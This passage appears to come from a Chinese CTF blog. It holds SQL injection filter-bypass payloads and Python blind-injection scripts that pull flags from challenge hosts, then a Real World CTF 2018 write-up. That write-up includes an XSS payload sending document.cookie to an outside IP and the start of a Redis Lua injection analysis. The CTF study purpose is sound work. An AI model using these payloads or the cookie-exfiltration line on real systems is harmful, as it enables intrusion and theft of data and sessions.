class=\"line\">mysql&gt; select benchmark(10000000,sha(1));</span><br><span class=\"line\">+----------------------------+</span><br><span class=\"line\">| benchmark(10000000,sha(1)) |</span><br><span class=\"line\">+----------------------------+</span><br><span class=\"line\">|                          0 |</span><br><span class=\"line\">+----------------------------+</span><br><span class=\"line\">1 row in set (2.79 sec)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><p>表名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select group_concat(distinct table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>列名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>数据库</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>表内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1,concat(user, 0x2c, password) from [table_name]</span><br></pre></td></tr></table></figure>\n<p>​</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">优先级 运算符</span><br><span class=\"line\">(最高)  !</span><br><span class=\"line\">    -（负号）,~（按位取反）</span><br><span class=\"line\">    ^（按位异或）</span><br><span class=\"line\">    *,/(DIV),%(MOD)</span><br><span class=\"line\">    +,-</span><br><span class=\"line\">    &gt;&gt;,&lt;&lt;</span><br><span class=\"line\">    &amp;</span><br><span class=\"line\">    |</span><br><span class=\"line\">    =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP</span><br><span class=\"line\">   BETWEEN AND,CASE,WHEN,THEN,ELSE</span><br><span class=\"line\">   NOT</span><br><span class=\"line\">   &amp;&amp;,AND</span><br><span class=\"line\">   XOR</span><br><span class=\"line\">   ||,OR</span><br><span class=\"line\">(最低)    =(赋值运算),:=</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"union-select-不允许同时出现\"><a href=\"#union-select-不允许同时出现\" class=\"headerlink\" title=\"union select 不允许同时出现\"></a>union select 不允许同时出现</h1><p>过滤正则表达式如下:<br><code><br>union[\\s\\xA0]+select<br></code><br><br>可以使用union all select绕过</p>\n<h1 id=\"select过滤\"><a href=\"#select过滤\" class=\"headerlink\" title=\"select过滤\"></a>select过滤</h1><p>se%00lect绕过</p>\n<h1 id=\"–-注释\"><a href=\"#–-注释\" class=\"headerlink\" title=\"– 注释\"></a>– 注释</h1><p>–后边不允许添加任何空白字符<br>过滤正则表达式如下:<br>–[\\s\\xA0]<br>还可以使用%1a<br>–%1a绕过</p>\n<h1 id=\"where后边跟着sleep函数\"><a href=\"#where后边跟着sleep函数\" class=\"headerlink\" title=\"where后边跟着sleep函数\"></a>where后边跟着sleep函数</h1><p><code>select * from table_name where sleep(2) or 1 = 2;</code></p>\n<p>如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回<br>如果1=1，则会立即返回所有数据</p>\n<p>@<code>&#39;</code> 相当于 NULL</p>\n<p>select group_concat(ip)’’ from client_ip;</p>\n<h1 id=\"DNSlog盲注\"><a href=\"#DNSlog盲注\" class=\"headerlink\" title=\"DNSlog盲注\"></a>DNSlog盲注</h1><p>DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>\n<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>\n<p>2、当secure_file_priv为G:\\，就可以读取G盘的文件。</p>\n<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>\n<p>sleep 不能填数字，可以使用pi()替代</p>\n<p>各种payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from antisqli where `id`=&apos;\\&apos; and `pw`=md5(&apos; union select 1,2,3--&apos;)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">644400 union select &apos;z1&apos;,flag,&apos;z3&apos;,&apos;z4&apos; from flag order by password desc#</span><br></pre></td></tr></table></figure>\n<p>关键词union,select,from被过滤，可以考虑%00绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//过滤sql</span><br><span class=\"line\">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class=\"line\">foreach ($array as $value)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (substr_count($id, $value) &gt; 0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\texit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//xss过滤</span><br><span class=\"line\">$id = strip_tags($id);</span><br><span class=\"line\"></span><br><span class=\"line\">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br><span class=\"line\">payload:</span><br><span class=\"line\">http://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#</span><br><span class=\"line\">由于strip_tags 将&lt;&gt;替换为空，所以可以使用&lt;&gt;绕过：</span><br><span class=\"line\">http://103.238.227.13:10087/?id=2 unio&lt;&gt;n se&lt;&gt;lect hash,2 fro%00m sql3.key#</span><br></pre></td></tr></table></figure>\n<p>某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。<br>id=1+uni%0bon+se%0blect+1,2,3–</p>\n<h1 id=\"Mysql大小写不敏感，绕过检测\"><a href=\"#Mysql大小写不敏感，绕过检测\" class=\"headerlink\" title=\"Mysql大小写不敏感，绕过检测\"></a>Mysql大小写不敏感，绕过检测</h1><h1 id=\"heavy-query\"><a href=\"#heavy-query\" class=\"headerlink\" title=\"heavy query\"></a>heavy query</h1><p><a href=\"http://www.360zhijia.com/anquan/369098.html\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"笛卡尔积运算\"><a href=\"#笛卡尔积运算\" class=\"headerlink\" title=\"笛卡尔积运算\"></a>笛卡尔积运算</h2><blockquote>\n<p>select <em> from content where id = 1 and 1 and (SELECT count(</em>) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">1000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\"</span> % (i, j)</span><br><span class=\"line\">        payload_url = url%(payload)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.get(url=payload_url,timeout=<span class=\"number\">8</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            data +=chr(j)</span><br><span class=\"line\">            <span class=\"keyword\">print</span> data</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Get-lock\"><a href=\"#Get-lock\" class=\"headerlink\" title=\"Get_lock\"></a>Get_lock</h2><p>get_lock是mysql的锁机制</p>\n<ul>\n<li>get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。</li>\n<li>当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来</li>\n</ul>\n<p>打开两个cmd</p>\n<p>cmd1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,1);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,1) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        1 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,5) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        0 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,2);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,2) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        0 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (2.00 sec)</span><br></pre></td></tr></table></figure>\n<p>关闭cmd1,cmd2执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,5) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        1 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是<code>mysql_connect</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql_connect() 脚本一结束，到服务器的连接就被关闭</span><br><span class=\"line\">mysql_pconnect() 打开一个到 MySQL 服务器的持久连接</span><br></pre></td></tr></table></figure>\n<p>官方描述：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。</span><br><span class=\"line\">首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。</span><br><span class=\"line\">其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。</span><br><span class=\"line\">简单来说，即</span><br><span class=\"line\">mysql_connect()使用后立刻就会断开</span><br><span class=\"line\">而</span><br><span class=\"line\">mysql_pconnect()会保持连接，并不会立刻断开</span><br></pre></td></tr></table></figure>\n<p>所以:</p>\n<p>我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源<code>skysec.top</code>加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了<code>mysql_connect()</code>，那么get_lock的方法将不适用 而<code>mysql_pconnect()</code>建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2</p>\n<p> cmd1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from content where id = 1 and get_lock(&apos;skysec.top&apos;,1);</span><br><span class=\"line\">+----+-------------------------------------+</span><br><span class=\"line\">| id | content                             |</span><br><span class=\"line\">+----+-------------------------------------+</span><br><span class=\"line\">|  1 | I think you may need sql injection! |</span><br><span class=\"line\">+----+-------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from content where id =1 and 1 and get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">Empty set (5.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from content where id =1 and 0 and get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>脚本如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">url1 = <span class=\"string\">\"http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23\"</span></span><br><span class=\"line\">r = requests.get(url=url1)</span><br><span class=\"line\">time.sleep(<span class=\"number\">90</span>)</span><br><span class=\"line\"><span class=\"comment\"># 加锁后变换身份</span></span><br><span class=\"line\">url2 = <span class=\"string\">\"http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">1000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">print</span> i</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\"</span> % (i, j) <span class=\"comment\">#article,flags</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)</span></span><br><span class=\"line\">        payload_url = url2%(payload)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            s = requests.get(url=payload_url,timeout=<span class=\"number\">4.5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            data +=chr(j)</span><br><span class=\"line\">            <span class=\"keyword\">print</span> data</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>总结:</p>\n<p>必须使用长连接，即使用mysql_pconnect()</p>\n<p>构造被加锁的数据</p>\n<p>1.以客户A的身份,对资源skysec.top进行加锁 </p>\n<p>2.等待90s，让服务器将我们下一次的查询当做客户B </p>\n<p>3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 </p>\n<h2 id=\"Rlike\"><a href=\"#Rlike\" class=\"headerlink\" title=\"Rlike\"></a>Rlike</h2><p>正则表达式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;</span><br></pre></td></tr></table></figure>\n<p>以上代码等同于sleep(5)</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from content where id =1 and IF(1,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;</span><br><span class=\"line\">Empty set (4.24 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<h2 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"sleep\"></a>sleep</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select sleep(5);</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">| sleep(5) |</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">|        0 |</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure>\n<p>BENCHMARK</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select benchmark(10000000,sha(1));</span><br><span class=\"line\">+----------------------------+</span><br><span class=\"line\">| benchmark(10000000,sha(1)) |</span><br><span class=\"line\">+----------------------------+</span><br><span class=\"line\">|                          0 |</span><br><span class=\"line\">+----------------------------+</span><br><span class=\"line\">1 row in set (2.79 sec)</span><br></pre></td></tr></table></figure>\n"},{"title":"real-world-ctf","date":"2018-07-30T12:25:36.000Z","_content":"\n## Web\n\n### dot free\n\n1. ip2long\n\n   ```\n   ip_addr='192.168.2.10'\n   \n   # transfer ip to int\n   def ip2long(ip):\n       ip_list=ip.split('.')\n       result=0\n       for i in range(4):  #0,1,2,3\n           result=result+int(ip_list[i])*256**(3-i)\n       return result\n   \n   long=3232236042\n   \n   # transfer int to ip\n   def long2ip(long):\n       floor_list=[]\n       yushu=long\n       for i in reversed(range(4)):   #3,2,1,0\n           res=divmod(yushu,256**i)\n           floor_list.append(str(res[0]))\n           yushu=res[1]\n       return '.'.join(floor_list)\n   \n   a=long2ip(long)\n   print(a)\n   ```\n\n2. 关键代码\n\n   ```javascript\n   window.addEventListener('message', function (e) {\n           if (e.data.iframe) {\n               if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf(\"//\") == -1 && e.data.iframe.value.indexOf(\"。\") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {\n                   if (e.data.iframe.type == \"iframe\") {\n                       lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);\n                   } else {\n                       lls(e.data.iframe.value)\n                   }\n               }\n           }\n       }, false);\n       window.onload = function (ev) {\n           postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')\n       }\n   ```\n\n3. 输入点\n\n   ```\n   decodeURIComponent(location.search.substr(1))\n   ```\n\n4. bypass\n\n   ```\n   e.data.iframe.value.indexOf(\"//\") == -1\n   =>\n   http:/\\\n   \n   \".\" 和 \"。\"均不能使用\n   =>\n   使用ip2long bypass\n   \n   ```\n\n5. payload\n\n   ```\n   http://13.57.104.34/?{%22iframe%22:{%22value%22:%22http:\\u002f\\u005c2077186703:1234%22}}\n   或者不要`http:` =>\n   http://13.57.104.34/?{%22iframe%22:{%22value%22:%20%22\\u002f\\u005c2077186703:1234/a%22}}\n   ```\n\n6. getflag\n\n   index.html\n\n   ```\n   document.location=\"http://123.207.90.143?flag=\"+document.cookie;\n   ```\n\n7. flag\n\n   ```\n   rwctf%7BL00kI5TheFlo9%7D\n   ```\n\n### bookhub\n\n1. 测试登录\n\n   ```\n   your ip address isn't in the 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.\n   ```\n\n2. 进入代码查看\n\n   ```\n   def get_remote_addr():\n       address = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)\n   \n       try:\n           ipaddress.ip_address(address)\n       except ValueError:\n           return None\n       else:\n           return address\n   ```\n\n3. 测试修改X-Forwarded-For，失败，原因: XFF做了反代理，伪造的 XFF被覆盖\n\n4. 打开 18.213.16.123:5000\n\n   发现该服务运行于debug模式下\n\n   ```\n   @login_required\n   @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])\n   def refresh_session():\n       \"\"\"\n           delete all session except the logined user\n   \n           :return: json\n           \"\"\"\n   \n           status = 'success'\n           sessionid = flask.session.sid\n           prefix = app.config['SESSION_KEY_PREFIX']\n   \n           if flask.request.form.get('submit', None) == '1':\n               try:\n                   rds.eval(rf'''\n                   local function has_value (tab, val)\n                       for index, value in ipairs(tab) do\n                           if value == val then\n                               return true\n                           end\n                       end\n                   \n                       return false\n                   end\n                   \n                   local inputs = {{ \"{prefix}{sessionid}\" }}\n                   local sessions = redis.call(\"keys\", \"{prefix}*\")\n                   \n                   for index, sid in ipairs(sessions) do\n                       if not has_value(inputs, sid) then\n                           redis.call(\"del\", sid)\n                       end\n                   end\n                   ''', 0)\n               except redis.exceptions.ResponseError as e:\n                   app.logger.exception(e)\n                   status = 'fail'\n   \n           return flask.jsonify(dict(status=status))\n   ```\n\n   上边这一段代码由于`@login_required` 写在route上边，所以存在未授权访问。\n\n   ![](/assets/realworldctf/TIM截图20180801194537.png)\n\n5. 添加csrf_token\n\n   ![](/assets/realworldctf/TIM截图20180801195906.png)\n\n6. 漏洞\n\n   ```\n   local inputs = {{ \"{prefix}{sessionid}\" }}\n   local sessions = redis.call(\"keys\", \"{prefix}*\")\n   ```\n\n   这里使用字符串拼接，存在问题，可以通过闭合双引号，使得redis执行恶意代码。\n\n7. 跟踪`{prefix}`\n\n   ```\n    prefix = app.config['SESSION_KEY_PREFIX']\n    \n    app.config['SESSION_KEY_PREFIX'] = 'bookhub:session:'\n   